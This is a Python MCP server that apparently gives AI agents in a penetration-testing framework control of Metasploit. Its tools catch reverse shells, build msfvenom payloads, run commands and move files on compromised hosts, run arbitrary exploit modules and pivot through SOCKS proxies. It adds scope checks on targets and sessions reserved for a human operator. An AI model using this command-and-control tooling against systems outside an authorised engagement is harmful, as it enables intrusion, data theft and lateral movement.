"""Metasploit Framework MCP server for PEN-AGENT.

Wraps the Metasploit RPC API (msfrpcd) via pymetasploit3, exposing handler
management, payload generation, session interaction, generic module execution,
and SOCKS pivoting as MCP tools. Connects to a running msfrpcd daemon using
engagement/msfrpc.yaml (written by run.sh / config.sh).

Metasploit is PEN-AGENT's C2 backend: initial shells are caught by shell-server,
then upgraded to Meterpreter sessions here for stable transport, file transfer,
post-exploitation modules, and pivoting.

Runs as SSE on 127.0.0.1:8024 (configurable via MSF_SSE_PORT).

Scope guardrail: every tool that takes a REMOTE target (run_module RHOSTS,
console `set RHOSTS`) validates it against engagement/scope.allow and refuses
out-of-scope targets. Session-directed tools operate on already-established
access and are not target-gated.
"""

from __future__ import annotations

import functools
import json
import os
import re
import shutil
import subprocess
import threading
import time
from datetime import datetime, timezone
from pathlib import Path

from mcp.server.fastmcp import FastMCP

from scope import ScopeError, check_scope
from validate import (
    ValidationError,
    validate_module_name,
    validate_module_type,
    validate_option_value,
)

_PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent
_SSE_PORT = int(os.environ.get("MSF_SSE_PORT", "8024"))

_NOT_CONFIGURED = (
    "ERROR: Metasploit RPC not configured for this engagement.\n"
    "Start it with ./run.sh (auto-starts msfrpcd + writes engagement/msfrpc.yaml),\n"
    "or run: msfrpcd -P <password> -U msf -a 127.0.0.1 -p 55553\n"
    "then create engagement/msfrpc.yaml with host/port/user/password/ssl."
)
_NOT_CONNECTED = (
    "ERROR: Failed to connect to msfrpcd. Ensure the daemon is running "
    "(pgrep -f msfrpcd) and engagement/msfrpc.yaml is correct."
)


def _find_config() -> Path | None:
    default = _PROJECT_ROOT / "engagement" / "msfrpc.yaml"
    return default if default.exists() else None


def _parse_config(path: Path) -> dict:
    """Minimal flat `key: value` parser (avoids a YAML dependency)."""
    cfg: dict[str, str] = {}
    for raw in path.read_text().splitlines():
        line = raw.split("#", 1)[0].strip()
        if not line or ":" not in line:
            continue
        key, _, value = line.partition(":")
        cfg[key.strip().lower()] = value.strip().strip('"').strip("'")
    return cfg


def _execute_error(result, expect_job: bool = False) -> str | None:
    """Return an error string if a module.execute() RPC result signals
    failure, else None.

    pymetasploit3's module.execute() returns a dict. On a server-side failure
    (e.g. option validation) msfrpcd does NOT raise — it returns
    {"error": True, "error_message": "..."} instead, which the old code
    ignored while reading a null job_id off it and still reporting success.
    Always surface an explicit error flag. When `expect_job` is set (the
    caller is starting something that always runs as a background job, like a
    handler or the SOCKS proxy), also treat a null `job_id` as failure, since
    that means msfrpcd never actually started the job. `run_module` with
    as_job=False legitimately has no job_id, so it leaves expect_job False.
    """
    if not isinstance(result, dict):
        return f"unexpected RPC result: {result!r}"
    if result.get("error"):
        return str(
            result.get("error_message")
            or result.get("error_string")
            or result
        )
    if expect_job and result.get("job_id") is None:
        return (
            "msfrpcd returned no job_id — the module did not start "
            f"(raw result: {result!r})"
        )
    return None


def _log_session_io(session_id: str, command: str, output: str) -> None:
    """Append one command+output record to the per-session log that the
    operator console reads (engagement/evidence/msf-sessions/<id>.jsonl).

    Best-effort: never breaks a tool call over logging, and skips silently
    when there's no engagement dir.
    """
    try:
        eng = _PROJECT_ROOT / "engagement"
        if not eng.exists():
            return
        d = eng / "evidence" / "msf-sessions"
        d.mkdir(parents=True, exist_ok=True)
        safe = re.sub(r"[^A-Za-z0-9_-]", "_", str(session_id)) or "unknown"
        rec = {
            "ts": datetime.now(tz=timezone.utc).isoformat(timespec="seconds"),
            "command": command,
            "output": output or "",
        }
        with (d / f"{safe}.jsonl").open("a") as f:
            f.write(json.dumps(rec) + "\n")
    except Exception:
        pass


# ── Operator-reserved sessions ───────────────────────────────────────────────
# Sessions tagged here belong to the human operator (interacted with in the
# tmux msfconsole). Agent-facing session tools refuse to touch them, so the
# operator and the agents never contend for the same session's shell. The
# registry is a small JSON side-file so the operator console can read it too.
_OPERATOR_SESSIONS = _PROJECT_ROOT / "engagement" / "operator-sessions.json"


def _load_reserved() -> dict:
    try:
        if _OPERATOR_SESSIONS.exists():
            data = json.loads(_OPERATOR_SESSIONS.read_text())
            if isinstance(data, dict) and isinstance(data.get("reserved"), dict):
                return data["reserved"]
    except Exception:
        pass
    return {}


def _save_reserved(reserved: dict) -> None:
    try:
        _OPERATOR_SESSIONS.parent.mkdir(parents=True, exist_ok=True)
        _OPERATOR_SESSIONS.write_text(json.dumps({"reserved": reserved}, indent=2))
    except Exception:
        pass


def _is_reserved(session_id) -> bool:
    return str(session_id) in _load_reserved()


def _reserved_guard(session_id) -> str | None:
    """Return a refusal (JSON) if the session is operator-reserved, else None."""
    if _is_reserved(session_id):
        return json.dumps({
            "error": "operator_reserved",
            "session_id": str(session_id),
            "message": (
                f"Session {session_id} is reserved for the human operator and "
                "must not be driven by agents. Pick a different session."
            ),
        })
    return None


def create_server() -> FastMCP:
    mcp = FastMCP(
        "pen-agent-metasploit-server",
        host="127.0.0.1",
        port=_SSE_PORT,
        instructions=(
            "Manages Metasploit C2 for PEN-AGENT. Use start_handler to catch "
            "payload callbacks, generate_payload to build msfvenom payloads, "
            "list_sessions to see active sessions, execute to run commands, "
            "upgrade_to_meterpreter to turn a shell into Meterpreter, run_module "
            "to run any exploit/auxiliary/post module (RHOSTS scope-checked), and "
            "start_socks_proxy to pivot into internal networks via autoroute+SOCKS."
        ),
    )

    _state: dict = {"client": None}

    # One shared MsfRpcClient (and the consoles it creates) is reused across
    # every tool call. FastMCP runs these sync tool handlers in a threadpool,
    # so two teammates calling msf tools at once would otherwise hit the same
    # client — and its single underlying requests.Session and console
    # objects — concurrently. pymetasploit3's client / requests.Session are
    # NOT thread-safe (interleaved request/response framing, a shared auth
    # token, shared console IDs), which corrupts the RPC stream and crashes
    # the connection. Serialize every RPC-touching tool behind one reentrant
    # lock: msf operations are effectively serial at msfrpcd anyway, so this
    # trades a little parallelism for not crashing. The lock is NOT held
    # during generate_payload (pure msfvenom subprocess, no shared client) so
    # a long payload build never blocks live RPC.
    _rpc_lock = threading.RLock()

    def _serialized(fn):
        """Serialize a tool handler's shared-client access behind _rpc_lock.
        functools.wraps preserves the signature/annotations FastMCP
        introspects to build the tool schema (inspect.signature follows
        __wrapped__), so the exposed tool is unchanged apart from locking.
        """
        @functools.wraps(fn)
        def _wrapper(*args, **kwargs):
            with _rpc_lock:
                return fn(*args, **kwargs)
        return _wrapper

    def _get_client():
        """Return a connected MsfRpcClient, or None if unavailable."""
        config_path = _find_config()
        if config_path is None:
            return None
        client = _state.get("client")
        if client is not None:
            try:
                client.core.version  # cheap liveness probe
                return client
            except Exception:
                _state["client"] = None
        try:
            from pymetasploit3.msfrpc import MsfRpcClient

            cfg = _parse_config(config_path)
            client = MsfRpcClient(
                cfg.get("password", ""),
                server=cfg.get("host", "127.0.0.1"),
                port=int(cfg.get("port", "55553")),
                username=cfg.get("user", "msf"),
                ssl=str(cfg.get("ssl", "true")).lower() in ("1", "true", "yes"),
            )
            client.core.version  # force auth/connect now
            _state["client"] = client
            return client
        except Exception:
            _state["client"] = None
            return None

    def _require_client():
        """Return (client, None) or (None, error_string)."""
        if _find_config() is None:
            return None, _NOT_CONFIGURED
        client = _get_client()
        if client is None:
            return None, _NOT_CONNECTED
        return client, None

    def _session(client, session_id: str):
        sid = str(session_id)
        if sid not in {str(k) for k in client.sessions.list}:
            return None
        return client.sessions.session(sid)

    # ── Handler / listener management ───────────────────────────────

    @mcp.tool()
    @_serialized
    def start_handler(
        payload: str = "",
        lhost: str = "",
        lport: int = 4444,
        exit_on_session: bool = False,
    ) -> str:
        """Start an exploit/multi/handler to catch a payload callback.

        Args:
            payload: Payload name, e.g. "linux/x64/meterpreter/reverse_tcp"
                     or "windows/x64/meterpreter/reverse_tcp". Required.
            lhost: Callback host (attackbox IP). Required.
            lport: Callback port (must match the payload). Default 4444.
            exit_on_session: Stop the handler after the first session (default
                             false — keep catching).
        """
        if not payload or not lhost:
            return "ERROR: payload and lhost are required."
        try:
            validate_module_name(payload)
            validate_option_value(lhost)
        except ValidationError as e:
            return f"ERROR: {e}"
        client, err = _require_client()
        if err:
            return err
        try:
            handler = client.modules.use("exploit", "multi/handler")
            pay = client.modules.use("payload", payload)
            pay["LHOST"] = lhost
            pay["LPORT"] = int(lport)
            # Work around an observed msfrpcd bug: this payload option's
            # RPC-exposed default comes back non-scalar, so module.execute()
            # fails server-side option validation ("Invalid module option
            # value for AutoLoadExtensions: must be a scalar") WITHOUT
            # raising — it returns an error dict instead. The old code read
            # job_id off that dict (null) and still reported "listening", so
            # no handler ever bound. Set it explicitly to avoid the bad
            # default, and surface the error dict below instead of swallowing
            # it.
            pay["AutoLoadExtensions"] = True
            handler["ExitOnSession"] = bool(exit_on_session)
            result = handler.execute(payload=pay)
            err_msg = _execute_error(result, expect_job=True)
            if err_msg:
                return f"ERROR: Failed to start handler: {err_msg}"
            return json.dumps(
                {
                    "status": "listening",
                    "job_id": result.get("job_id"),
                    "uuid": result.get("uuid"),
                    "payload": payload,
                    "lhost": lhost,
                    "lport": int(lport),
                }
            )
        except Exception as e:
            return f"ERROR: Failed to start handler: {e}"

    @mcp.tool()
    @_serialized
    def list_jobs() -> str:
        """List active Metasploit jobs (handlers, servers, aux modules)."""
        client, err = _require_client()
        if err:
            return err
        try:
            jobs = client.jobs.list
            result = [{"job_id": jid, "name": name} for jid, name in jobs.items()]
            return json.dumps({"jobs": result, "count": len(result)})
        except Exception as e:
            return f"ERROR: {e}"

    @mcp.tool()
    @_serialized
    def kill_job(job_id: str = "") -> str:
        """Stop a Metasploit job.

        Args:
            job_id: Job ID from list_jobs. Required.
        """
        if job_id == "":
            return "ERROR: job_id is required."
        client, err = _require_client()
        if err:
            return err
        try:
            client.jobs.stop(str(job_id))
            return json.dumps({"status": "killed", "job_id": str(job_id)})
        except Exception as e:
            return f"ERROR: {e}"

    # ── Payload generation (msfvenom) ───────────────────────────────

    @mcp.tool()
    def generate_payload(
        payload: str = "",
        lhost: str = "",
        lport: int = 4444,
        format: str = "elf",
        name: str = "",
        extra_options: str = "",
    ) -> str:
        """Generate a payload with msfvenom, saved to engagement/evidence/.

        Args:
            payload: Payload name, e.g. "windows/x64/meterpreter/reverse_tcp".
                     Required.
            lhost: Callback host (attackbox IP). Required.
            lport: Callback port (must match the handler). Default 4444.
            format: Output format — elf, exe, raw, dll, psh, python, war, etc.
            name: Optional output filename (without path).
            extra_options: Extra "KEY=VALUE KEY=VALUE" msfvenom datastore options
                           (e.g. "EXITFUNC=thread RC4PASSWORD=foo").
        """
        if not payload or not lhost:
            return "ERROR: payload and lhost are required."
        msfvenom = shutil.which("msfvenom")
        if not msfvenom:
            return "ERROR: msfvenom not found in PATH (install metasploit-framework)."
        try:
            validate_module_name(payload)
            for token in [lhost, str(lport), format, *extra_options.split()]:
                validate_option_value(token)
        except ValidationError as e:
            return f"ERROR: {e}"

        evidence_dir = _PROJECT_ROOT / "engagement" / "evidence"
        evidence_dir.mkdir(parents=True, exist_ok=True)
        ext = {"exe": ".exe", "dll": ".dll", "elf": "", "war": ".war",
               "psh": ".ps1", "python": ".py", "raw": ".bin"}.get(format, "")
        filename = name or f"payload-{int(time.time())}{ext}"
        filepath = evidence_dir / filename

        cmd = [
            msfvenom, "-p", payload,
            f"LHOST={lhost}", f"LPORT={int(lport)}",
            "-f", format, "-o", str(filepath),
        ]
        for opt in extra_options.split():
            cmd.append(opt)

        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            if not filepath.exists():
                return (
                    "ERROR: msfvenom failed.\n"
                    f"stderr: {proc.stderr[-600:] if proc.stderr else ''}"
                )
            size = filepath.stat().st_size
            try:
                filepath.chmod(0o755)
            except OSError:
                pass
            return json.dumps(
                {
                    "status": "generated",
                    "name": filename,
                    "path": str(filepath),
                    "size": size,
                    "payload": payload,
                    "callback": f"{lhost}:{int(lport)}",
                }
            )
        except subprocess.TimeoutExpired:
            return "ERROR: msfvenom timed out after 300s."
        except Exception as e:
            return f"ERROR: Payload generation failed: {e}"

    # ── Session management ──────────────────────────────────────────

    @mcp.tool()
    @_serialized
    def list_sessions() -> str:
        """List all active Metasploit sessions with metadata."""
        client, err = _require_client()
        if err:
            return err
        try:
            sessions = client.sessions.list
            reserved = _load_reserved()
            result = []
            for sid, meta in sessions.items():
                result.append(
                    {
                        "session_id": str(sid),
                        "type": meta.get("type"),
                        "tunnel_peer": meta.get("tunnel_peer"),
                        "via_exploit": meta.get("via_exploit"),
                        "platform": meta.get("platform"),
                        "arch": meta.get("arch"),
                        "username": meta.get("username"),
                        "info": meta.get("info"),
                        "alive": True,
                        # True → reserved for the human operator; agents must not
                        # drive it (execute/upload/kill/… refuse it).
                        "operator_reserved": str(sid) in reserved,
                    }
                )
            return json.dumps({"sessions": result, "count": len(result)})
        except Exception as e:
            return f"ERROR: {e}"

    @mcp.tool()
    @_serialized
    def execute(session_id: str = "", command: str = "", timeout: int = 30) -> str:
        """Run a command on an existing session (shell or Meterpreter).

        Operates on already-established access — not target-gated.

        Args:
            session_id: Session ID from list_sessions. Required.
            command: Command to run. For shell sessions this is a shell command
                     ("id && uname -a"); for Meterpreter it is a Meterpreter
                     console command ("sysinfo", "getuid", "ls"). Required.
            timeout: Seconds to wait for output. Default 30.
        """
        if not session_id or not command:
            return "ERROR: session_id and command are required."
        guard = _reserved_guard(session_id)
        if guard:
            return guard
        client, err = _require_client()
        if err:
            return err
        try:
            session = _session(client, session_id)
            if session is None:
                return f"ERROR: Session {session_id} not found or dead."
            output = session.run_with_output(command, timeout=timeout)
            _log_session_io(session_id, command, output)
            return json.dumps(
                {"status": "executed", "session_id": str(session_id), "output": output}
            )
        except TypeError:
            # Older pymetasploit3 shell sessions: write/read fallback.
            try:
                session.write(command)
                time.sleep(2)
                output = session.read()
                _log_session_io(session_id, command, output)
                return json.dumps(
                    {"status": "executed", "session_id": str(session_id),
                     "output": output}
                )
            except Exception as e:
                return f"ERROR: Command execution failed: {e}"
        except Exception as e:
            return f"ERROR: Command execution failed: {e}"

    @mcp.tool()
    @_serialized
    def upgrade_to_meterpreter(session_id: str = "", lhost: str = "", lport: int = 4433) -> str:
        """Upgrade a raw shell session to Meterpreter.

        Runs post/multi/manage/shell_to_meterpreter against the shell session.

        Args:
            session_id: Shell session ID to upgrade. Required.
            lhost: Callback host for the Meterpreter stager. Required.
            lport: Callback port for the upgrade (default 4433).
        """
        if not session_id or not lhost:
            return "ERROR: session_id and lhost are required."
        guard = _reserved_guard(session_id)
        if guard:
            return guard
        try:
            validate_option_value(lhost)
        except ValidationError as e:
            return f"ERROR: {e}"
        client, err = _require_client()
        if err:
            return err
        try:
            mod = client.modules.use("post", "multi/manage/shell_to_meterpreter")
            mod["SESSION"] = int(session_id)
            mod["LHOST"] = lhost
            mod["LPORT"] = int(lport)
            result = mod.execute()
            # shell_to_meterpreter spins up its own handler job — a null
            # job_id / error dict means the upgrade never actually launched.
            err_msg = _execute_error(result, expect_job=True)
            if err_msg:
                return f"ERROR: Upgrade failed: {err_msg}"
            return json.dumps(
                {
                    "status": "upgrade_started",
                    "session_id": str(session_id),
                    "job_id": result.get("job_id"),
                    "hint": "Poll list_sessions for the new Meterpreter session.",
                }
            )
        except Exception as e:
            return f"ERROR: Upgrade failed: {e}"

    @mcp.tool()
    @_serialized
    def upload(session_id: str = "", local_path: str = "", remote_path: str = "") -> str:
        """Upload a file to a Meterpreter session target.

        Args:
            session_id: Meterpreter session ID. Required.
            local_path: Local file to upload. Required.
            remote_path: Destination path on target. Required.
        """
        if not session_id or not local_path or not remote_path:
            return "ERROR: session_id, local_path, and remote_path are required."
        if not Path(local_path).exists():
            return f"ERROR: Local file not found: {local_path}"
        guard = _reserved_guard(session_id)
        if guard:
            return guard
        client, err = _require_client()
        if err:
            return err
        try:
            session = _session(client, session_id)
            if session is None:
                return f"ERROR: Session {session_id} not found or dead."
            out = session.run_with_output(f"upload {local_path} {remote_path}", timeout=120)
            return json.dumps(
                {"status": "uploaded", "remote_path": remote_path, "output": out}
            )
        except Exception as e:
            return f"ERROR: Upload failed: {e}"

    @mcp.tool()
    @_serialized
    def download(session_id: str = "", remote_path: str = "", local_path: str = "") -> str:
        """Download a file from a Meterpreter session target.

        Saved under engagement/evidence/ by default.

        Args:
            session_id: Meterpreter session ID. Required.
            remote_path: File path on target. Required.
            local_path: Local destination (default engagement/evidence/<name>).
        """
        if not session_id or not remote_path:
            return "ERROR: session_id and remote_path are required."
        guard = _reserved_guard(session_id)
        if guard:
            return guard
        client, err = _require_client()
        if err:
            return err
        if not local_path:
            evidence_dir = _PROJECT_ROOT / "engagement" / "evidence"
            evidence_dir.mkdir(parents=True, exist_ok=True)
            local_path = str(evidence_dir / (Path(remote_path).name or "download"))
        try:
            session = _session(client, session_id)
            if session is None:
                return f"ERROR: Session {session_id} not found or dead."
            out = session.run_with_output(f"download {remote_path} {local_path}", timeout=120)
            return json.dumps(
                {"status": "downloaded", "remote_path": remote_path,
                 "local_path": local_path, "output": out}
            )
        except Exception as e:
            return f"ERROR: Download failed: {e}"

    @mcp.tool()
    @_serialized
    def ifconfig(session_id: str = "") -> str:
        """List network interfaces on a Meterpreter session target (pivot detection).

        Args:
            session_id: Meterpreter session ID. Required.
        """
        if not session_id:
            return "ERROR: session_id is required."
        guard = _reserved_guard(session_id)
        if guard:
            return guard
        client, err = _require_client()
        if err:
            return err
        try:
            session = _session(client, session_id)
            if session is None:
                return f"ERROR: Session {session_id} not found or dead."
            return json.dumps(
                {"session_id": str(session_id),
                 "output": session.run_with_output("ifconfig", timeout=30)}
            )
        except Exception as e:
            return f"ERROR: {e}"

    @mcp.tool()
    @_serialized
    def kill_session(session_id: str = "") -> str:
        """Terminate a Metasploit session.

        Args:
            session_id: Session ID. Required.
        """
        if not session_id:
            return "ERROR: session_id is required."
        guard = _reserved_guard(session_id)
        if guard:
            return guard
        client, err = _require_client()
        if err:
            return err
        try:
            session = _session(client, session_id)
            if session is None:
                return f"ERROR: Session {session_id} not found or dead."
            session.stop()
            return json.dumps({"status": "killed", "session_id": str(session_id)})
        except Exception as e:
            return f"ERROR: {e}"

    # ── Operator-reserved sessions ──────────────────────────────────

    @mcp.tool()
    @_serialized
    def reserve_operator_session(session_id: str = "", note: str = "operator") -> str:
        """Reserve an existing session for the HUMAN OPERATOR.

        Agent-facing session tools (execute, upload, download, ifconfig,
        upgrade_to_meterpreter, kill_session, start_socks_proxy) then REFUSE to
        act on it, so the operator can drive it in the tmux msfconsole without
        contending with the agents. Reversible with release_operator_session.

        Args:
            session_id: Session ID to hand to the operator. Required.
            note: Free-text label (e.g. which host / why). Default "operator".
        """
        if not session_id:
            return "ERROR: session_id is required."
        client, err = _require_client()
        if err:
            return err
        if str(session_id) not in {str(k) for k in client.sessions.list}:
            return f"ERROR: Session {session_id} not found or dead."
        reserved = _load_reserved()
        reserved[str(session_id)] = {
            "reserved_at": datetime.now(tz=timezone.utc).isoformat(timespec="seconds"),
            "note": note,
        }
        _save_reserved(reserved)
        return json.dumps({"status": "reserved", "session_id": str(session_id), "note": note})

    @mcp.tool()
    @_serialized
    def release_operator_session(session_id: str = "") -> str:
        """Release an operator-reserved session back to the agents."""
        if not session_id:
            return "ERROR: session_id is required."
        reserved = _load_reserved()
        existed = reserved.pop(str(session_id), None) is not None
        _save_reserved(reserved)
        return json.dumps({"status": "released" if existed else "not_reserved",
                           "session_id": str(session_id)})

    def _spawn_sibling(session_id: str, lhost: str, lport: int, label: str) -> dict:
        """Shared spawn primitive: re-stage a fresh session from a SHELL foothold
        via shell_to_meterpreter and return the new session id. Returns a dict:
        {new_sid} on success, or {needs_manual|unconfirmed|error} otherwise."""
        try:
            validate_option_value(lhost)
        except ValidationError as e:
            return {"error": f"{e}"}
        client, err = _require_client()
        if err:
            return {"error": err}
        sessions = client.sessions.list
        if str(session_id) not in {str(k) for k in sessions}:
            return {"error": f"Session {session_id} not found or dead."}
        key = int(session_id) if str(session_id).isdigit() else session_id
        stype = str(sessions[key].get("type", ""))
        if "meterpreter" in stype.lower():
            return {"needs_manual": (
                "Source is a Meterpreter session — can't re-stage a sibling from "
                "here. Catch another callback (or open one in tmux) and reserve/"
                "assign it manually."
            )}
        before = {str(k) for k in sessions}
        try:
            mod = client.modules.use("post", "multi/manage/shell_to_meterpreter")
            mod["SESSION"] = int(session_id)
            mod["LHOST"] = lhost
            mod["LPORT"] = int(lport)
            result = mod.execute()
            err_msg = _execute_error(result, expect_job=True)
            if err_msg:
                return {"error": f"{label} spawn failed: {err_msg}"}
        except Exception as e:
            return {"error": f"{label} spawn failed: {e}"}
        for _ in range(30):
            time.sleep(1)
            fresh = {str(k) for k in client.sessions.list} - before
            if fresh:
                return {"new_sid": sorted(fresh, key=lambda s: int(s) if s.isdigit() else s)[-1]}
        return {"unconfirmed": result.get("job_id")}

    @mcp.tool()
    @_serialized
    def spawn_session(session_id: str = "", lhost: str = "", lport: int = 0) -> str:
        """Spawn a SECOND session from a foothold for a DIFFERENT AGENT to use.

        Use this so two agents never drive the same session's shell at once
        (their commands and any interactive/stateful state would collide). When
        an agent needs to interact with a host another agent already has, spawn
        it its own session here and hand back the new id. Not reserved — it's a
        normal agent session.

        Reliable from a SHELL source (re-stages via shell_to_meterpreter); from
        a Meterpreter source returns needs_manual (no shell to re-stage).

        Args:
            session_id: An existing foothold session on the host. Required.
            lhost: Callback host for the new session. Required.
            lport: Callback port — use one distinct from other handlers. Required.
        """
        if not session_id or not lhost or not lport:
            return "ERROR: session_id, lhost, and lport are required."
        r = _spawn_sibling(session_id, lhost, int(lport), "Agent-session")
        if "error" in r:
            return f"ERROR: {r['error']}"
        if "needs_manual" in r:
            return json.dumps({"status": "needs_manual", "message": r["needs_manual"]})
        if "unconfirmed" in r:
            return json.dumps({"status": "spawn_started_unconfirmed", "job_id": r["unconfirmed"],
                               "message": "No new session within 30s — poll list_sessions."})
        return json.dumps({"status": "spawned", "session_id": r["new_sid"],
                           "from_session_id": str(session_id)})

    @mcp.tool()
    @_serialized
    def spawn_operator_session(session_id: str = "", lhost: str = "", lport: int = 4444) -> str:
        """Spawn a SECOND session from a foothold and reserve it for the operator.

        Call this once per host right after a foothold so the operator always
        has a dedicated session to interact with while the agents keep working
        the original — no contention on a single shell.

        Reliable path (source is a shell): runs
        post/multi/manage/shell_to_meterpreter to spawn a fresh Meterpreter
        session, which is then reserved. For a Meterpreter-origin foothold there
        is no shell to re-stage from here, so this returns needs_manual — catch
        a second callback yourself (or attach one in tmux) and call
        reserve_operator_session on it.

        Args:
            session_id: The foothold session to spawn a sibling from. Required.
            lhost: Callback host for the new session's stager. Required.
            lport: Callback port for the new session (default 4444). Use a port
                   distinct from the agents' handlers.
        """
        if not session_id or not lhost:
            return "ERROR: session_id and lhost are required."
        r = _spawn_sibling(session_id, lhost, int(lport), "Operator-session")
        if "error" in r:
            return f"ERROR: {r['error']}"
        if "needs_manual" in r:
            return json.dumps({
                "status": "needs_manual",
                "message": r["needs_manual"] + " Then call reserve_operator_session on it.",
            })
        if "unconfirmed" in r:
            return json.dumps({
                "status": "spawn_started_unconfirmed",
                "job_id": r["unconfirmed"],
                "message": ("Spawn launched but no new session appeared within 30s. "
                            "Poll list_sessions; reserve it with reserve_operator_session."),
            })
        new_sid = r["new_sid"]
        reserved = _load_reserved()
        reserved[new_sid] = {
            "reserved_at": datetime.now(tz=timezone.utc).isoformat(timespec="seconds"),
            "note": f"operator (spawned from session {session_id})",
        }
        _save_reserved(reserved)
        return json.dumps({
            "status": "reserved",
            "operator_session_id": new_sid,
            "from_session_id": str(session_id),
            "message": f"Session {new_sid} spawned and reserved for the operator.",
        })

    # ── Generic module execution (scope-gated on RHOSTS) ────────────

    @mcp.tool()
    @_serialized
    def run_module(
        module_type: str = "",
        module_name: str = "",
        options: str = "{}",
        payload: str = "",
        as_job: bool = True,
    ) -> str:
        """Run any Metasploit module (exploit, auxiliary, post).

        Remote targets (RHOSTS/RHOST in options) are validated against
        engagement/scope.allow — out-of-scope targets are refused.

        Args:
            module_type: exploit | auxiliary | post. Required.
            module_name: Module path, e.g. "windows/smb/ms17_010_eternalblue".
                         Required.
            options: JSON object of datastore options, e.g.
                     '{"RHOSTS": "10.10.10.5", "RPORT": 445}'. Required for
                     most modules.
            payload: Payload name (exploit modules only).
            as_job: Run in the background as a job (default true).
        """
        if not module_type or not module_name:
            return "ERROR: module_type and module_name are required."
        try:
            validate_module_type(module_type)
            validate_module_name(module_name)
            opts = json.loads(options) if options else {}
            if not isinstance(opts, dict):
                return "ERROR: options must be a JSON object."
        except (ValidationError, json.JSONDecodeError) as e:
            return f"ERROR: {e}"

        # Scope gate on remote targets.
        for key in ("RHOSTS", "RHOST", "rhosts", "rhost"):
            if key in opts and opts[key]:
                for tgt in str(opts[key]).replace(",", " ").split():
                    try:
                        check_scope(tgt, _PROJECT_ROOT)
                    except ScopeError as e:
                        return f"ERROR: {e}"

        client, err = _require_client()
        if err:
            return err
        try:
            mod = client.modules.use(module_type, module_name)
            for k, v in opts.items():
                validate_option_value(str(v))
                mod[k] = v
            if payload:
                validate_module_name(payload)
                pay = client.modules.use("payload", payload)
                # Same msfrpcd AutoLoadExtensions bug worked around in
                # start_handler — set it explicitly, but only when the payload
                # actually exposes the option (non-Meterpreter payloads don't,
                # and setting an unknown option would itself error).
                try:
                    if "AutoLoadExtensions" in getattr(pay, "options", []):
                        pay["AutoLoadExtensions"] = True
                except Exception:
                    pass
                result = mod.execute(payload=pay)
            else:
                result = mod.execute()
            # expect_job stays False: auxiliary/post modules legitimately
            # return no job_id, so only an explicit error dict is a failure
            # here. (The null-job_id check is for always-background jobs like
            # handlers and the SOCKS proxy.)
            err_msg = _execute_error(result)
            if err_msg:
                return f"ERROR: Module execution failed: {err_msg}"
            return json.dumps({"status": "executed", "module": module_name, "result": result})
        except ValidationError as e:
            return f"ERROR: {e}"
        except Exception as e:
            return f"ERROR: Module execution failed: {e}"

    # ── Raw console (scope-gated on `set RHOSTS`) ───────────────────

    @mcp.tool()
    @_serialized
    def console_exec(command: str = "", read_timeout: int = 30) -> str:
        """Run raw msfconsole command(s) and return the output.

        Use run_module for structured execution; this is the flexibility escape
        hatch. Any `set RHOSTS`/`set RHOST` line is scope-checked against
        engagement/scope.allow before running — out-of-scope targets are refused.

        Args:
            command: One or more console commands separated by newlines. Required.
            read_timeout: Max seconds to wait for output. Default 30.
        """
        if not command:
            return "ERROR: command is required."
        import re

        for line in command.splitlines():
            m = re.match(r"\s*set\s+(?:g\s+)?rhosts?\s+(.+)", line, re.IGNORECASE)
            if m:
                for tgt in m.group(1).replace(",", " ").split():
                    try:
                        check_scope(tgt, _PROJECT_ROOT)
                    except ScopeError as e:
                        return f"ERROR: {e}"
        client, err = _require_client()
        if err:
            return err
        try:
            console = client.consoles.console()
            console.write(command)
            deadline = time.time() + max(1, read_timeout)
            output = ""
            while time.time() < deadline:
                chunk = console.read()
                output += chunk.get("data", "")
                if not chunk.get("busy"):
                    time.sleep(0.5)
                    tail = console.read()
                    output += tail.get("data", "")
                    if not tail.get("busy"):
                        break
                time.sleep(0.5)
            try:
                client.consoles.destroy(console.cid)
            except Exception:
                pass
            return json.dumps({"status": "executed", "output": output})
        except Exception as e:
            return f"ERROR: Console execution failed: {e}"

    # ── Pivoting: autoroute + SOCKS ─────────────────────────────────

    @mcp.tool()
    @_serialized
    def start_socks_proxy(session_id: str = "", srvport: int = 1080) -> str:
        """Pivot into a session's internal network via autoroute + SOCKS5.

        Adds routes through the session (post/multi/manage/autoroute) and starts
        an auxiliary/server/socks_proxy job bound to 127.0.0.1. Use with
        proxychains to route tools through the tunnel.

        Args:
            session_id: Meterpreter session ID on the pivot host. Required.
            srvport: Local SOCKS port (default 1080).
        """
        if not session_id:
            return "ERROR: session_id is required."
        guard = _reserved_guard(session_id)
        if guard:
            return guard
        client, err = _require_client()
        if err:
            return err
        try:
            auto = client.modules.use("post", "multi/manage/autoroute")
            auto["SESSION"] = int(session_id)
            auto["CMD"] = "autoadd"
            auto_result = auto.execute()
            auto_err = _execute_error(auto_result)
            if auto_err:
                return f"ERROR: autoroute failed, no routes added: {auto_err}"

            socks = client.modules.use("auxiliary", "server/socks_proxy")
            socks["SRVHOST"] = "127.0.0.1"
            socks["SRVPORT"] = int(srvport)
            socks["VERSION"] = "5"
            result = socks.execute()
            # The SOCKS proxy always runs as a background job — a null job_id /
            # error dict means it never bound, so don't report a usable
            # endpoint the caller would then try (and fail) to proxy through.
            err_msg = _execute_error(result, expect_job=True)
            if err_msg:
                return f"ERROR: Failed to start SOCKS proxy: {err_msg}"
            return json.dumps(
                {
                    "status": "started",
                    "session_id": str(session_id),
                    "job_id": result.get("job_id"),
                    "port": int(srvport),
                    "endpoint": f"socks5://127.0.0.1:{int(srvport)}",
                    "proxychains_line": f"socks5 127.0.0.1 {int(srvport)}",
                    "hint": "Routes added via autoroute. Use proxychains4 for tools.",
                }
            )
        except Exception as e:
            return f"ERROR: Failed to start SOCKS proxy: {e}"

    # ── Health route ────────────────────────────────────────────────

    from starlette.requests import Request
    from starlette.responses import Response

    @mcp.custom_route("/status", methods=["GET"])
    async def status(request: Request) -> Response:
        if _find_config() is None:
            body = json.dumps({"status": "not_configured", "sessions": 0})
        else:
            client = _get_client()
            if client is None:
                body = json.dumps({"status": "disconnected", "sessions": 0})
            else:
                try:
                    body = json.dumps(
                        {"status": "connected", "sessions": len(client.sessions.list)}
                    )
                except Exception:
                    body = json.dumps({"status": "error", "sessions": 0})
        return Response(content=body, media_type="application/json")

    return mcp


def main() -> None:
    create_server().run(transport="sse")


if __name__ == "__main__":
    main()
